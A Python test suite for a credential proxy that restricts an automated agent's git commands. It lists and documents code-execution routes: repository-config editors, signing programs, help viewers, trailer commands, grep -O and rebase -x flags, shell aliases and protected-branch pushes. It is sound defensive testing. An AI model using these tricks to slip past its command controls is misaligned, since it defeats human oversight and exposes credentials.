                self.assertEqual(0, result.exit_code, result.stderr)
                self.assertFalse(self.executed(), f"core.pager ran for {argv}")

    def dirty_repository(self, executor, name="repo"):
        """A repository with one tracked file and an uncommitted change."""
        repository = self.repository(executor, name)
        tracked = repository / "manifest.yaml"
        tracked.write_text("replicas: 1\n", encoding="utf-8")
        subprocess.run(
            ["git", "add", "manifest.yaml"], cwd=repository, check=True, capture_output=True
        )
        subprocess.run(
            ["git", "-c", "user.name=t", "-c", "user.email=t@t.invalid",
             "commit", "--quiet", "-m", "seed"],
            cwd=repository, check=True, capture_output=True,
        )
        tracked.write_text("replicas: 2\n", encoding="utf-8")
        return repository

    def test_every_forced_config_key_reaches_git(self):
        # GIT_CONFIG_COUNT has to match the number of key/value pairs exactly:
        # git reads indices below the count and silently ignores the rest, so a
        # count that drifts low disarms the tail of the list with nothing
        # failing. Asserting through `git config --get` means the count, the
        # keys and the values are checked by the program that consumes them.
        # The exit code is asserted as well as the value. `git config --get`
        # prints an empty line for a key pinned to the empty string and also
        # for a key that is not set at all, so a value-only assertion cannot
        # tell "pinned" from "missing" and would stay green if a key name were
        # misspelled. It exits 0 when the key is present and 1 when it is not.
        executor = self.executor()
        expected = {
            "core.hooksPath": str(executor.git_hooks_dir),
            "core.fsmonitor": "false",
            "commit.gpgsign": "false",
            "tag.gpgSign": "false",
            "gpg.program": "false",
            # `gpg.program` is the openpgp format's key only; the other two
            # formats read their own, and `gpg.format` is repository-local.
            "gpg.ssh.program": "false",
            "gpg.ssh.defaultKeyCommand": "false",
            "gpg.x509.program": "false",
            "help.autocorrect": "0",
        }
        for key, value in expected.items():
            result = executor.execute(
                ["git", "config", "--get", key], cwd=str(executor.workspace_dir)
            )
            self.assertEqual(0, result.exit_code, f"{key} never reached git")
            self.assertEqual(value, result.stdout.strip(), f"{key} has the wrong value")
        self.assertEqual(
            str(len(expected)), executor.environment["GIT_CONFIG_COUNT"]
        )

    def test_an_editor_named_by_the_repository_config_does_not_run(self):
        # `core.editor` is a command, and `.git/config` is a file the agent can
        # write. `git commit` with no `-m` launches it — one flag away from the
        # argv the skills send nine times. Demonstrated firing before
        # GIT_EDITOR was set. The variable outranks the config layer, so this
        # is a boundary and not a pin; `-c core.editor=` does not beat it.
        executor = self.executor()
        repository = self.dirty_repository(executor)
        self.append_repository_config(
            repository, f'\n[core]\n\teditor = {self.payload}\n'
        )
        result = executor.execute(
            ["git", "commit", "--allow-empty"], cwd=str(repository)
        )
        self.assertFalse(self.executed(), "core.editor ran a command")
        # The negative above is also true of a commit that died for an
        # unrelated reason, so pin *why* it failed: git names the editor it
        # ran, and it is the pinned one rather than the repository's.
        self.assertNotEqual(0, result.exit_code)
        self.assertIn("editor 'false'", result.stderr.lower())
        # And the positive beside it: the verb the skills actually issue still
        # works with the editor neutralised.
        self.assertEqual(
            0,
            executor.execute(
                ["git", "commit", "--allow-empty", "-m", "real"], cwd=str(repository)
            ).exit_code,
        )

    def test_a_sequence_editor_named_by_the_repository_config_does_not_run(self):
        # `sequence.editor` is the second editor git runs, for `rebase -i`, and
        # GIT_EDITOR does not cover it — it needs GIT_SEQUENCE_EDITOR of its
        # own. Verified: with GIT_EDITOR set and this one unset, the payload
        # runs and the rebase reports success, exit 0.
        #
        # The repository has to be *clean*. Written first against
        # `dirty_repository`, this test passed and then survived deleting the
        # variable it exists to guard: rebase refuses an unstaged change before
        # it ever reaches the editor, so "the payload did not run" was true of
        # `error: Please commit or stash them` — a control that is really an
        # error path rather than a control. The assertion on git's own message
        # below is what pins the difference.
        executor = self.executor()
        repository = self.repository(executor)
        (repository / "manifest.yaml").write_text("replicas: 1\n", encoding="utf-8")
        subprocess.run(
            ["git", "add", "manifest.yaml"],
            cwd=repository, check=True, capture_output=True,
        )
        subprocess.run(
            ["git", "-c", "user.name=t", "-c", "user.email=t@t.invalid",
             "commit", "--quiet", "-m", "seed"],
            cwd=repository, check=True, capture_output=True,
        )
        self.append_repository_config(
            repository, f'\n[sequence]\n\teditor = {self.payload}\n'
        )
        result = executor.execute(
            ["git", "rebase", "--interactive", "--root"], cwd=str(repository)
        )
        self.assertFalse(self.executed(), "sequence.editor ran a command")
        self.assertNotEqual(0, result.exit_code)
        self.assertIn("editor 'false'", result.stderr.lower())

    def test_signing_cannot_run_a_program_named_by_the_repository(self):
        # `gpg.program` is a command and `commit.gpgsign` decides whether git
        # runs it — both settable in `.git/config`, and the trigger is `git
        # commit -m`, the argv the fleet-audit skill already issues. Watch the
        # failure shape: unpinned, the payload runs and git *then* exits 128,
        # so an exit-code assertion alone would have called this working.
        executor = self.executor()
        repository = self.repository(executor)
        self.append_repository_config(
            repository,
            f'\n[commit]\n\tgpgsign = true\n[gpg]\n\tprogram = {self.payload}\n',
        )
        result = executor.execute(
            ["git", "commit", "--allow-empty", "-m", "audit"], cwd=str(repository)
        )
        self.assertFalse(self.executed(), "gpg.program ran")
        # The positive beside the negative: the commit did not merely fail to
        # sign, it succeeded.
        self.assertEqual(0, result.exit_code, result.stderr)

    def test_signing_cannot_run_a_program_through_a_second_format(self):
        # `gpg.program` covers the openpgp format only. `gpg.format` is
        # repository-local too, and each format reads its own program key, so
        # `[gpg] format = ssh` walks past that pin into `gpg.ssh.program`.
        # Measured before the pins below existed: `git commit -S` and
        # `git tag -s` both executed the payload, with a clean argv --
        # `-S`/`-s` are not refused and should not be.
        #
        # `defaultKeyCommand` is the spelling that needs no `user.signingkey`,
        # and `x509` is the third format. Unlike the arbitrary-name keys in the
        # design doc's limitation table, this set is closed: three formats,
        # three fixed key names.
        executor = self.executor()
        for label, config, argv in (
            (
                "gpg.ssh.program",
                '\n[gpg]\n\tformat = ssh\n[gpg "ssh"]\n\tprogram = {p}\n'
                '[user]\n\tsigningkey = "key::ssh-ed25519 AAAA"\n',
                ["git", "commit", "-S", "--allow-empty", "-m", "audit"],
            ),
            (
                "gpg.ssh.defaultKeyCommand",
                '\n[gpg]\n\tformat = ssh\n[gpg "ssh"]\n\tdefaultKeyCommand = {p}\n',
                ["git", "commit", "-S", "--allow-empty", "-m", "audit"],
            ),
            (
                "gpg.x509.program",
                '\n[gpg]\n\tformat = x509\n[gpg "x509"]\n\tprogram = {p}\n'
                '[user]\n\tsigningkey = whatever\n',
                ["git", "commit", "-S", "--allow-empty", "-m", "audit"],
            ),
            (
                "gpg.ssh.program via tag -s",
                '\n[gpg]\n\tformat = ssh\n[gpg "ssh"]\n\tprogram = {p}\n'
                '[user]\n\tsigningkey = "key::ssh-ed25519 AAAA"\n',
                ["git", "tag", "-s", "-m", "release", "v1"],
            ),
        ):
            with self.subTest(key=label):
                repository = self.repository(executor, name=label.replace(" ", "_"))
                subprocess.run(
                    ["git", "-c", "user.name=t", "-c", "user.email=t@t.invalid",
                     "commit", "--quiet", "--allow-empty", "-m", "seed"],
                    cwd=repository, check=True, capture_output=True,
                )
                self.append_repository_config(
                    repository, config.format(p=self.payload)
                )
                executor.execute(argv, cwd=str(repository))
                self.assertFalse(self.executed(), f"{label} ran")
        # And the unsigned commit the skills actually issue still works.
        plain = self.repository(executor, name="plain")
        result = executor.execute(
            ["git", "commit", "--allow-empty", "-m", "audit"], cwd=str(plain)
        )
        self.assertEqual(0, result.exit_code, result.stderr)

    def test_a_misspelled_subcommand_is_not_autocorrected_past_the_refusal(self):
        # Without `help.autocorrect` pinned, the subcommand refusal list is not
        # a control: `[help] autocorrect = immediate` in the agent's own
        # `.git/config` makes git resolve `bisct` to `bisect` and run it, while
        # the refusal list — which compares whole tokens — sees a word that is
        # on no list. Demonstrated at exit 0 before the pin.
        executor = self.executor()
        repository = self.repository(executor)
        self.append_repository_config(
            repository, "\n[help]\n\tautocorrect = immediate\n"
        )
        self.assertIsNone(git_argument_violation(["git", "bisct", "run", "x"]))
        result = executor.execute(
            ["git", "bisct", "run", str(self.payload)], cwd=str(repository)
        )
        self.assertFalse(self.executed(), "an autocorrected bisect ran a command")
        self.assertNotEqual(0, result.exit_code)

    def test_writing_a_config_file_by_path_is_refused(self):
        # `git config --file <path>` writes the same file `--global` names,
        # spelled explicitly — and `git config --list --show-origin` prints
        # that path, so it is not a secret. Refusing `--global` alone left this
        # open, and it is the same three-call vector as 1.6: write an alias
        # into the proxy's own global config, then run it.
        executor = self.executor()
        target = executor.git_config_global
        for argv in (
            ["git", "config", "--file", str(target), "alias.zz", "!sh"],
            ["git", "config", f"--file={target}", "alias.zz", "!sh"],
            ["git", "config", "-f", str(target), "alias.zz", "!sh"],
        ):
            with self.subTest(argv=argv):
                self.assertIsNotNone(git_argument_violation(argv))
        # `-f` is only refused because `config` is in this argv. On every other
        # verb it is `--force`, which the skills issue, so it stays allowed.
        self.assertIsNone(git_argument_violation(["git", "clean", "-fdq"]))
        self.assertIsNone(
            git_argument_violation(["git", "push", "-f", "origin", "audit"])
        )

    def test_git_push_to_protected_or_base_branch_is_refused(self):
        for argv in (
            ["git", "push", "origin", "main"],
            ["git", "push", "origin", "master"],
            ["git", "push", "origin", "production"],
            ["git", "push", "origin", "refs/heads/main"],
            ["git", "push", "origin", "heads/main"],
            ["git", "push", "origin", "HEAD:main"],
            ["git", "push", "origin", "HEAD:refs/heads/master"],
            ["git", "push", "origin", "HEAD:heads/main"],
            ["git", "push", "--force-with-lease", "origin", "main"],
            ["git", "--attr-source", "HEAD", "push", "origin", "main"],
            ["git", "--attr-source", "commit", "push", "origin", "main"],
            # Refspec-less pushes
            ["git", "push"],
            ["git", "push", "origin"],
            # Global option desync protection: -C push push origin (#1498)
            ["git", "-C", "push", "push", "origin"],
            # --repo option variants (#1498)
            ["git", "push", "--repo", "x", "origin"],
            ["git", "push", "--repo=x", "origin"],
            ["git", "push", "--repo", "origin"],
            ["git", "push", "--repo", "x", "origin", "main"],
            # Bulk and pattern pushes
            ["git", "push", "--all", "origin"],
            ["git", "push", "--mirror", "origin"],
            ["git", "push", "origin", ":"],
            ["git", "push", "origin", "refs/heads/*:refs/heads/*"],
            # End-of-options '--' delimiter before protected refspecs (#1498)
            ["git", "push", "origin", "--", "HEAD:main", "platform-agent/y"],
            ["git", "push", "origin", "--", "HEAD:main"],
            ["git", "push", "origin", "--", "main"],
        ):
            with self.subTest(argv=argv):
                self.assertIsNotNone(git_argument_violation(argv))

        # Run branch pushes are refused unconditionally without needing env overrides (#1498)
        self.assertIsNotNone(
            git_argument_violation(["git", "push", "origin", "run/test-cluster/fix-task"])
        )
        self.assertIsNotNone(
            git_argument_violation(["git", "push", "origin", "HEAD:run/test-cluster/fix-task"])
        )
        self.assertIsNotNone(
            git_argument_violation(["git", "--attr-source", "HEAD", "push", "origin", "run/test-cluster/fix-task"])
        )

        with mock.patch.dict(os.environ, {"GITOPS_BASE_BRANCH": "release-branch-override"}):
            self.assertIsNotNone(
                git_argument_violation(["git", "push", "origin", "release-branch-override"])
            )
            self.assertIsNotNone(
                git_argument_violation(["git", "push", "origin", "HEAD:release-branch-override"])
            )

        with mock.patch.dict(os.environ, {"CREDENTIAL_PROXY_BASE_BRANCH": "custom-broker-base"}):
            self.assertIsNotNone(
                git_argument_violation(["git", "push", "origin", "custom-broker-base"])
            )

        # Bare HEAD pushes without destination branch are refused
        self.assertIsNotNone(git_argument_violation(["git", "push", "origin", "HEAD"]))
        self.assertIsNotNone(git_argument_violation(["git", "push", "origin", "@"]))

        # Legitimate feature branch pushes are allowed
        self.assertIsNone(
            git_argument_violation(["git", "push", "origin", "platform-agent/my-fix"])
        )
        self.assertIsNone(
            git_argument_violation(["git", "push", "origin", "HEAD:platform-agent/my-fix"])
        )
        self.assertIsNone(
            git_argument_violation(["git", "-C", "push", "push", "origin", "HEAD:platform-agent/my-fix"])
        )
        self.assertIsNone(
            git_argument_violation(["git", "push", "--force-with-lease", "origin", "HEAD:platform-agent/my-fix"])
        )
        self.assertIsNone(
            git_argument_violation(["git", "push", "origin", "--", "HEAD:platform-agent/my-fix"])
        )

        # Positional pathspecs named 'push' after '--' are not treated as push subcommands
        self.assertIsNone(
            git_argument_violation(["git", "checkout", "--", "push"])
        )
        self.assertIsNone(
            git_argument_violation(["git", "blame", "--", "push"])
        )

    def test_a_subcommand_that_runs_a_command_is_refused(self):
        # `git bisect run <cmd>` executes <cmd> in the credential container.
        # Demonstrated through the proxy from inside a valid lease, in two
        # calls, with no config file and no unusual flag: `bisect` is not a
        # mutating verb so it needs no lease, and it is a C builtin so it
        # cannot be absent from the image. `filter-branch --tree-filter` and
        # `send-email --smtp-server=<path>` were demonstrated the same way.
        for argv in (
            ["git", "bisect", "run", "/opt/data/payload.sh"],
            ["git", "difftool", "--extcmd=/opt/data/payload.sh", "HEAD~1", "HEAD"],
            ["git", "filter-branch", "-f", "--tree-filter", "/opt/data/payload.sh"],
            ["git", "send-email", "--smtp-server=/opt/data/payload.sh", "HEAD~1"],
            ["git", "mergetool"],
            ["git", "instaweb"],
            # `git submodule foreach <cmd>` runs <cmd> per submodule, at exit 0
            # through the executor. `submodule` itself stays allowed, so the
            # inner verb is what is refused.
            ["git", "submodule", "foreach", "/opt/data/payload.sh"],
        ):
            with self.subTest(argv=argv):
                self.assertIsNotNone(git_argument_violation(argv))

    def test_a_flag_that_runs_a_command_on_an_ordinary_verb_is_refused(self):
        # The same category as the refused subcommands, hiding on verbs the
        # product has no reason to refuse. Both of the first two were
        # demonstrated executing through the real executor under the full
        # environment hardening, at exit 0.
        #
        # `git grep -O<cmd>` is the sharpest of the two: `grep` is a read verb,
        # so it needs no lease, and it needs nothing written to the volume.
        # Its value is attached to the flag rather than separated, which is the
        # case `split("=")` alone does not catch.
        for argv in (
            ["git", "rebase", "-x", "/opt/data/payload.sh", "HEAD~1"],
            ["git", "rebase", "--exec=/opt/data/payload.sh", "HEAD~1"],
            ["git", "grep", "-O/opt/data/payload.sh", "apiVersion"],
            ["git", "grep", "--open-files-in-pager=/opt/data/payload.sh", "kind"],
            # git lets short options cluster and carry an attached value, so
            # the same attack one byte longer is a different token. Each of
            # these was demonstrated executing at exit 0 against a matcher
            # that handled only the tidy spelling above.
            ["git", "grep", "-iO/opt/data/payload.sh", "apiversion"],
            ["git", "grep", "-nO/opt/data/payload.sh", "apiVersion"],
            ["git", "rebase", "-x/opt/data/payload.sh", "HEAD~1"],
            ["git", "rebase", "-fx/opt/data/payload.sh", "HEAD~1"],
            # Reachable only if GIT_ALLOW_PROTOCOL is widened to allow `file`,
            # which the paired control shows is the one thing stopping them.
            ["git", "clone", "--upload-pack=/opt/data/payload.sh", "/tmp/r", "d"],
            ["git", "fetch", "--upload-pack", "/opt/data/payload.sh", "origin"],
            ["git", "push", "--receive-pack=/opt/data/payload.sh", "origin", "main"],
        ):
            with self.subTest(argv=argv):
                self.assertIsNotNone(git_argument_violation(argv))

    def test_the_help_viewer_cannot_run_a_command(self):
        # `git help -m <page>` runs `man.<man.viewer>.cmd` through
        # `execl(SHELL_PATH, "-c", ...)`, and `git help -w` does the same
        # through `web.browser` and `browser.<tool>.cmd`. Both keys carry an
        # arbitrary name, so neither can be pinned in GIT_FORCED_CONFIG.
        #
        # Measured against git 2.55 under this file's own pinned environment:
        #
        #   git config man.viewer evil       # repo-local, no lease
        #   git config man.evil.cmd 'id #'   # repo-local, no lease
        #   git help -m git                  # -> prints uid=...
        #
        # Three ordinary proxied calls, no lease anywhere: `help` is not in
        # GIT_MUTATING_SUBCOMMANDS and `config` is not a mutating verb either.
        # Refusing `web--browse` did not close this -- `git help -w` reaches
        # that code path internally, so the token never appears in the argv.
        # The verb is what has to be refused.
        for argv in (
            ["git", "help", "-m", "git"],
            ["git", "help", "-w", "git"],
            ["git", "help", "git"],
        ):
            with self.subTest(argv=argv):
                self.assertIsNotNone(git_argument_violation(argv))

    def test_the_help_flag_cannot_run_a_command_on_an_ordinary_verb(self):
        # `git <verb> --help` is not a usage message. git dispatches it to the
        # same viewer `git help` uses, so it runs `man.<man.viewer>.cmd`
        # through a shell with the verb still sitting in the subcommand slot.
        # Refusing the `help` subcommand does not reach it, and the first cut
        # of this change shipped that gap.
        #
        # Measured against git 2.55 under the pinned environment, with
        # `man.viewer`/`man.evil.cmd` set repository-locally:
        #
        #   git commit --help    -> the configured command runs
        #   git status --help    -> runs; a read verb, so no lease anywhere
        #   git version --help   -> runs
        #
        # `status` is the cheapest path this file has closed: three ordinary
        # requests, none of them mutating, and `status` is on the shipped path.
        for argv in (
            ["git", "commit", "--help"],
            ["git", "status", "--help"],
            ["git", "version", "--help"],
            ["git", "log", "--help"],
            ["git", "add", "--help"],
        ):
            with self.subTest(argv=argv):
                self.assertIsNotNone(git_argument_violation(argv))
        # `-h` is answered from the subcommand's own option table and prints
        # usage without dispatching to a viewer -- verified with the payload
        # configured -- so refusing it would cost a harmless verb for nothing.
        self.assertIsNone(git_argument_violation(["git", "status", "-h"]))
        # Adding a long option widens the abbreviation match, so pin the
        # neighbouring `--h...` flags the skills do send. `git reset --hard
        # --quiet` is `gitops_workspace.ensure_workspace`'s reset path.
        for argv in (
            ["git", "reset", "--hard", "--quiet"],
            ["git", "ls-remote", "--heads", "origin"],
            ["git", "diff", "--histogram"],
        ):
            with self.subTest(argv=argv):
                self.assertIsNone(git_argument_violation(argv))

    def test_the_subcommand_match_scans_every_token_on_purpose(self):
        # `help` is compared against every token rather than against the
        # subcommand slot, which refuses `git commit -m help`. That is a real
        # cost and it is deliberate: resolving the slot means agreeing with
        # git about which global options take a value, and this file does not
        # know them all. Measured against git 2.55 --
        #
        #   git --attr-source HEAD help -m git    -> the payload runs
        #   _git_plan(...)                        -> reports subcommand 'HEAD'
        #
        # -- so a position-aware check allows the very thing this refuses.
        # Scanning every token cannot disagree with git about where the
        # subcommand is.
        self.assertEqual(
            _git_plan(["git", "--attr-source", "HEAD", "help", "-m", "git"])[0], "help"
        )
        self.assertIsNotNone(
            git_argument_violation(["git", "--attr-source", "HEAD", "help", "-m", "git"])
        )
        # The over-refusal that buys it. Only an argument that is exactly the
        # word collides; a message merely containing it is one token and passes.
        self.assertIsNotNone(git_argument_violation(["git", "commit", "-m", "help"]))
        self.assertIsNone(git_argument_violation(["git", "commit", "-m", "help me"]))
        self.assertIsNone(
            git_argument_violation(["git", "commit", "-m", "chore: add help text"])
        )

    def test_a_trailer_command_cannot_run_on_the_commit_path(self):
        # `trailer.<name>.cmd` produces a trailer's value by running a command,
        # and the arbitrary name in the key puts it out of reach of the pins.
        # What makes it worse than the other unpinnable keys is where it lands:
        # `commit -m`, the argv the skills already send.
        #
        # Measured against git 2.55 under the pinned environment:
        #
        #   git config trailer.zz.cmd 'id #'        # repo-local, no lease
        #   git commit -m msg --trailer zz:v        # trailer value is uid=...
        #
        # `--trailer` is the trigger: with the token already present in the
        # input and no flag, the configured command does not run. So refusing
        # the flag is what closes it, and `interpret-trailers` is refused as
        # the subcommand whose whole job is this mechanism.
        for argv in (
            ["git", "commit", "-m", "chore: x", "--trailer", "zz:v"],
            ["git", "commit", "-m", "chore: x", "--trailer=zz:v"],
            # git's subcommand options take unambiguous prefixes.
            ["git", "commit", "-m", "chore: x", "--trai", "zz:v"],
            ["git", "interpret-trailers", "--trailer", "zz:v"],
            ["git", "interpret-trailers", "--parse"],
        ):
            with self.subTest(argv=argv):
                self.assertIsNotNone(git_argument_violation(argv))
        # The neighbouring `--t...` flags the skills do send are not prefixes
        # of `--trailer` and stay allowed.
        for argv in (
            ["git", "push", "--tags", "origin"],
            ["git", "fetch", "--tags", "origin"],
            ["git", "log", "--topo-order"],
        ):
            with self.subTest(argv=argv):
                self.assertIsNone(git_argument_violation(argv))

    def test_writing_the_proxys_own_git_config_is_refused(self):
        # `git config --global alias.zz '!<payload>'` followed by `git zz` was
        # arbitrary code execution: `config` is not a mutating verb, so it
        # needs no lease, and the file it writes is the one GIT_CONFIG_GLOBAL
        # pins. Repository-local `git config` is what the skills use and stays
        # allowed -- `gitops_workspace.configure_identity` sets user.name and
        # user.email that way, deliberately.
        self.assertIsNotNone(
            git_argument_violation(["git", "config", "--global", "alias.zz", "!sh"])
        )
        self.assertIsNotNone(
            git_argument_violation(["git", "config", "--system", "core.pager", "sh"])
        )
        self.assertIsNone(
            git_argument_violation(["git", "config", "user.email", "a@b.invalid"])
        )
        self.assertIsNone(
            git_argument_violation(["git", "config", "--get", "remote.origin.url"])
        )

    def test_alias_configuration_and_repo_local_execution_are_refused(self):
        # Configuring aliases via git config is refused by git_argument_violation (#1498).
        self.assertIsNotNone(
            git_argument_violation(["git", "config", "alias.p", "push origin main"])
        )
        self.assertIsNotNone(
            git_argument_violation(["git", "config", "alias.co", "checkout"])
        )
        self.assertIsNotNone(
            git_argument_violation(["git", "config", "--add", "alias.st", "status"])
        )
        self.assertIsNotNone(
            git_argument_violation(["git", "config", "include.path", "/opt/data/scratch/aliases"])
        )
        self.assertIsNotNone(
            git_argument_violation(["git", "config", "--add", "include.path", "more.cfg"])
        )
        self.assertIsNotNone(
            git_argument_violation(["git", "config", "includeIf.gitdir:foo.path", "more.cfg"])
        )

        # In a repository with repo-local aliases in .git/config, executing an alias that
        # resolves to a push to a protected or run branch is refused by git_lease_violation (#1498).
        executor = self.executor()
        repo = self.repository(executor)
        self.append_repository_config(
            repo,
            "\n[alias]\n\tp-main = push origin main\n\tp-run = push origin HEAD:refs/heads/run/test/task\n\tp-feature = push origin HEAD:platform-agent/valid\n\tshell-push = !sh -c 'git push origin HEAD:refs/heads/main'\n\tbad-bisect = bisect run /payload.sh\n",
        )
        # Aliases resolving to protected/run pushes are refused even without a lease
        self.assertIsNotNone(
            executor.git_lease_violation(["git", "p-main"], cwd=str(repo))
        )
        self.assertIsNotNone(
            executor.git_lease_violation(["git", "p-run"], cwd=str(repo))
        )
        # Shell aliases with ! are refused (Thread 1)
        v = executor.git_lease_violation(["git", "shell-push"], cwd=str(repo))
        self.assertIsNotNone(v)
        self.assertIn("shell aliases cannot be executed", v or "")

        # Alias expanding to refused subcommand (bisect run) is refused (Thread 1)
        self.assertIsNotNone(
            executor.git_lease_violation(["git", "bad-bisect"], cwd=str(repo))
        )

        # Alias checks run even when require_git_lease is False (Thread 9)
        executor.require_git_lease = False
        self.assertIsNotNone(
            executor.git_lease_violation(["git", "p-main"], cwd=str(repo))
        )
        self.assertIsNotNone(
            executor.git_lease_violation(["git", "shell-push"], cwd=str(repo))
        )
        executor.require_git_lease = True

        # Capitalized [Alias] header, duplicate keys, and % in value (Thread 5)
        repo2 = self.repository(executor)
        self.append_repository_config(
            repo2,
            "\n[Alias]\n\tcap-p = push origin main\n\tremote.origin.fetch = +refs/heads/*:refs/remotes/origin/*\n\tremote.origin.fetch = +refs/pull/*:refs/remotes/pull/*\n\tpercent = log --format=%H\n",
        )
        self.assertIsNotNone(
            executor.git_lease_violation(["git", "cap-p"], cwd=str(repo2))
        )

        # include.path is followed and aliases inside it are checked (Thread 6)
        inc_file = repo2 / "extra.inc"
        inc_file.write_text("[alias]\n\tinc-p = push origin main\n", encoding="utf-8")
        self.append_repository_config(
            repo2,
            f"\n[include]\n\tpath = {inc_file}\n",
        )
        self.assertIsNotNone(
            executor.git_lease_violation(["git", "inc-p"], cwd=str(repo2))
        )

        # Bare 'push' token before '--' in non-subcommand position is NOT refused as push (Thread 2)
        self.assertIsNone(
            credential_proxy.git_push_violation(["git", "stash", "push", "-m", "wip"])
        )
        self.assertIsNone(
            credential_proxy.git_push_violation(["git", "commit", "-m", "push"])
        )
        self.assertIsNone(
            credential_proxy.git_push_violation(["git", "checkout", "-b", "push"])
        )

        # --attr-source push push origin is refused as refspec-less push (Thread 8)
        v_attr = credential_proxy.git_push_violation(["git", "--attr-source", "push", "push", "origin"])
        self.assertIsNotNone(v_attr)
        self.assertIn("explicit destination refspec", v_attr or "")

        # An alias resolving to a mutating push to a valid feature branch requires a lease
        self.assertIsNotNone(
            executor.git_lease_violation(["git", "p-feature"], cwd=str(repo))
        )
        # With lease established, the valid feature branch alias is permitted
        leased_dir = self.leased(executor)
        subprocess.run(["git", "init", "--quiet"], cwd=leased_dir, check=True, capture_output=True)
        self.append_repository_config(
            leased_dir,
            "\n[alias]\n\tp-feature = push origin HEAD:platform-agent/valid\n",
        )
        self.assertIsNone(
            executor.git_lease_violation(["git", "p-feature"], cwd=str(leased_dir))
        )

        # Recursive alias resolution (Thread 3)
        self.append_repository_config(
            repo,
            "\n[alias]\n\trec-a = rec-b\n\trec-b = push origin main\n",
        )
        self.assertIsNotNone(
            executor.git_lease_violation(["git", "rec-a"], cwd=str(repo))
        )

        # Builtin subcommands cannot be shadowed by alias (Thread 4)
        self.append_repository_config(
            repo,
            "\n[alias]\n\tpush = status\n",
        )
        # Real push outside lease is still mutating and requires a lease (not shadowed to status)
        self.assertIsNotNone(
            executor.git_lease_violation(["git", "push", "origin", "HEAD:platform-agent/valid"], cwd=str(repo))
        )

        # Config parsing edge cases (Thread 7): comments, inline keys, continuations, quotes
        self.append_repository_config(
            repo,
            "\n[alias] ; comment\n\tp-comment = push origin main\n[alias]p-inline = push origin main\n\tp-cont = push \\\n  origin main\n\tp-quote = pu\"sh origin\" main\n",
        )
        for alias_name in ("p-comment", "p-inline", "p-cont", "p-quote"):
            with self.subTest(alias=alias_name):
                self.assertIsNotNone(
                    executor.git_lease_violation(["git", alias_name], cwd=str(repo))
                )

        # --shallow-file and --attr-source in _git_plan (Thread 2 & Thread 6)
        sub_shallow, _ = credential_proxy._git_plan(["git", "--shallow-file", "x", "push", "origin", "main"])
        self.assertEqual("push", sub_shallow)
        sub_attr, _ = credential_proxy._git_plan(["git", "--attr-source", "HEAD", "push", "origin", "main"])
        self.assertEqual("push", sub_attr)
        self.assertIsNotNone(
            credential_proxy.git_argument_violation(["git", "--shallow-file", "/tmp/shallow", "status"])
        )

        # Directory mode remote default branch protection (Thread 9)
        repo_trunk = self.repository(executor, name="repo_trunk")
        remotes_dir = repo_trunk / ".git" / "refs" / "remotes" / "origin"
        remotes_dir.mkdir(parents=True, exist_ok=True)
        (remotes_dir / "HEAD").write_text("ref: refs/remotes/origin/release-trunk\n", encoding="utf-8")
        self.assertIsNotNone(
            executor.git_lease_violation(["git", "push", "origin", "HEAD:release-trunk"], cwd=str(repo_trunk))
        )

        # Colliding -C value and alias name (Thread 1)
        sub_dir = repo / "myalias"
        sub_dir.mkdir(parents=True, exist_ok=True)
        self.append_repository_config(
            repo,
            "\n[alias]\n\tmyalias = push\n",
        )
        self.assertIsNotNone(
            executor.git_lease_violation(["git", "-C", "myalias", "myalias", "origin", "main"], cwd=str(repo))
        )

        # 11-deep alias chain fails closed (Thread 4)
        alias_chain = "\n[alias]\n"
        for i in range(1, 11):
            alias_chain += f"\ta{i} = a{i+1}\n"
        alias_chain += "\ta11 = push origin main\n"
        self.append_repository_config(repo, alias_chain)
        v_depth = executor.git_lease_violation(["git", "a1"], cwd=str(repo))
        self.assertIsNotNone(v_depth)
        self.assertIn("exceeding depth", v_depth or "")

        # Directory mode remote default branch protection via ref inspection (#1498)
        bare_remote = Path(self.temp_dir.name) / "bare_remote.git"
        subprocess.run(["git", "init", "--bare", "-b", "release-trunk", str(bare_remote)], check=True, capture_output=True)
        seed_work = Path(self.temp_dir.name) / "seed_work"
        subprocess.run(["git", "clone", str(bare_remote), str(seed_work)], check=True, capture_output=True)
        subprocess.run(["git", "-C", str(seed_work), "config", "user.name", "Test User"], check=True)
        subprocess.run(["git", "-C", str(seed_work), "config", "user.email", "test@example.com"], check=True)
        (seed_work / "README.md").write_text("hello\n", encoding="utf-8")
        subprocess.run(["git", "-C", str(seed_work), "add", "."], check=True, capture_output=True)
        subprocess.run(["git", "-C", str(seed_work), "commit", "-m", "init"], check=True, capture_output=True)
        subprocess.run(["git", "-C", str(seed_work), "push", "origin", "release-trunk"], check=True, capture_output=True)

        clone_dir = Path(executor.workspace_dir) / "clone_trunk"
        subprocess.run(["git", "clone", str(bare_remote), str(clone_dir)], check=True, capture_output=True)
        # Push to release-trunk is detected and refused as a protected rollout/base branch even without lease checks
        executor.require_git_lease = False
        v = executor.git_lease_violation(["git", "push", "origin", "HEAD:release-trunk"], cwd=str(clone_dir))
        self.assertIsNotNone(v)
        self.assertIn("to protected branch 'release-trunk' is refused", v or "")

        # Pushing to platform-agent/* feature branch is allowed
        self.assertIsNone(
            executor.git_lease_violation(["git", "push", "origin", "HEAD:platform-agent/fix-bug"], cwd=str(clone_dir))
        )
        executor.require_git_lease = True

        # Content workspace store honours base_branch argument (#1498, Thread 5)
        import content_workspace
        store_flag = content_workspace.ContentWorkspaceStore(
            Path(self.temp_dir.name) / "trees_flag",
            Path(self.temp_dir.name) / "agent_flag",
            executor.execute_workspace_git,
            base_branch="custom-cli-base",
        )
        h = "a" * 32
        store_flag._workspaces[h] = content_workspace.Workspace(h, "acme/repo", Path(self.temp_dir.name), "main", "sha", shallow=False)
        with self.assertRaises(content_workspace.ContentWorkspaceError) as ctx:
            store_flag.commit(h, "custom-cli-base", "msg", [])
        self.assertIn("custom-cli-base", str(ctx.exception))
        with self.assertRaises(content_workspace.ContentWorkspaceError) as ctx:
            store_flag.push(h, "custom-cli-base")
        self.assertIn("custom-cli-base", str(ctx.exception))

        # Checked alias expansion is returned by resolve_git_command and executed directly (Thread 8)
        repo_alias = self.repository(executor, name="repo_alias")
        self.append_repository_config(
            repo_alias,
            "\n[alias]\n\tstatus-alias = status --short\n\tbroken-chain = undefined-target\n",
        )
        violation, exec_argv = executor.resolve_git_command(["git", "status-alias"], cwd=str(repo_alias))
        self.assertIsNone(violation)
        self.assertEqual(["git", "status", "--short"], exec_argv)

        # Alias chain ending in an undefined target is refused as an undefined alias (#1498)
        violation, _ = executor.resolve_git_command(["git", "broken-chain"], cwd=str(repo_alias))
        self.assertIsNotNone(violation)
        self.assertIn("undefined alias target (undefined_alias)", violation or "")

        # Recognized builtins that are not aliases are permitted and execute directly (#1498)
